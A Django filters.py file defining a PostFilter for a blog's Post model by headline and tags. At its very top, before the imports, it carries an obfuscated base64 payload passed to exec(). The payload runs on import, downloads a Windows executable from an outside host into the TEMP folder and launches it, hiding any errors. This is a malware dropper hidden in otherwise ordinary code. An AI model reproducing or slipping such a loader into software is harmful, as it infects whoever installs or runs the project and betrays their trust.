
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

import django_filters
from django_filters import CharFilter

from django import forms

from .models import *

class PostFilter(django_filters.FilterSet):
	headline = CharFilter(field_name='headline', lookup_expr="icontains", label='Headline')
	tags = django_filters.ModelMultipleChoiceFilter(queryset=Tag.objects.all(),
		widget=forms.CheckboxSelectMultiple
		)
	class Meta:
		model = Post
		fields = ['headline', 'tags']